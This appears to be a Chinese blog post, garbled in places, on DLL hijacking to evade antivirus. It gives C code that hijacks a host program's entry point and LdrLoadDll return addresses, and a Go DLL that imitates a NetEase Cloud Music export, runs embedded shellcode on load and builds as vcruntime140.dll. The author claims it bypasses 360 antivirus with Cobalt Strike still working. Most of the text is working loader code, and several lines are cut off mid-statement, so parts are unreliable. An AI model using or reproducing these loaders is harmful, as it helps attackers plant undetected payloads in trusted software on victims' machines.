    switch (_fdwReason) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, test, NULL, 0, NULL); // 必须使用线程
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}
77C71B73    50              push eax
77C71B74    58              pop eax
77C71B75  ^ EB FC           jmp short 77C71B73
#include 
杀毒测试
就这么简单改写后，测试杀毒免杀360，cs也能正常使用。
extern void test();
void dlljack(){
    DWORD baseAddress = (DWORD)GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + 
dosHeader->e_lfanew);
    DWORD entryPoint = (DWORD)baseAddress + ntHeader-
>OptionalHeader.AddressOfEntryPoint;
    DWORD old;
    BYTE shellcode[4] = { 0x50,0x58,0xEB,0xFC };
    int size = 4;
    VirtualProtect((LPVOID)entryPoint, size, PAGE_READWRITE, &old);
    for (int i = 0; i  ldrLoadDll + 0x1000){
        printf("over\n");
        break;
    }
    if (*stack > ldrLoadDll && *stack 
extern void test();
void dlljack2(){
    char evilstring[10] = { 0x90 };
    DWORD ldrLoadDll = (DWORD)GetProcAddress(GetModuleHandleA("ntdll"), 
"LdrLoadDll");
    DWORD* stack = (DWORD)evilstring + (DWORD)evilstring % 4;
    while (1)
    {
        stack++;
        if ((DWORD)stack > ldrLoadDll + 0x1000) {
            break;
        }
        if (*stack > ldrLoadDll && *stack  ldrLoadDll + 0x100) {
            break;
        }
        if (*stack > ldrLoadDll && *stack < ldrLoadDll + 0x100) {
测试成功。
缺点就是这个 LoadLibraryW ，在win10下我们要从 KernelBase 这个dll获取，不太通用。
另一种想法
在思考上述的问题的过程中，想到， post-load 类型我们也完全可以就用go模仿它dll里面的导出函数，
直接在 init() 函数里面执行shellcode就行了。
以网易云为例子
它的导出函数就是一个 CreateExceptionHandler2
            *stack = (DWORD)func11;
            printf(stack);
            MessageBoxW(0,0,0,0);
            return;
        }
    }
}
package main
import "C"
import (
    "encoding/hex"
    "syscall"
    "unsafe"
)
const (
    PAGE_EXECUTE_READ uintptr = 0x20
)
func RUN(buf []byte) {
    var hProcess uintptr = 0
    var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
    var dwBufferLen = uint(len(buf))
    var dwOldPerm uint32
    ntdll := syscall.NewLazyDLL("ntdll")
    ZwProtectVirtualMemory := ntdll.NewProc("ZwProtectVirtualMemory")
    ZwProtectVirtualMemory.Call(hProcess-1,
        uintptr(unsafe.Pointer(&pBaseAddr)),
        uintptr(unsafe.Pointer(&dwBufferLen)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&dwOldPerm)))
    syscall.Syscall(
        uintptr(unsafe.Pointer(&buf[0])),
        0, 0, 0, 0,
    )
}
编译
这样也能运行
func RunShellcode() {
    shellcode, err := 
hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac
3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a
498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01
d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87
ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c6300")
    if err != nil {
        panic(err)
    }
    RUN(shellcode)
}
func init() {
    RunShellcode()
}
//export CreateExceptionHandler2
func CreateExceptionHandler2(){}
func main(){}
set GOOS=windows
set GOARCH=386
set CGO_ENABLED=1
go build -ldflags "-s -w" -o vcruntime140.dll -buildmode=c-shared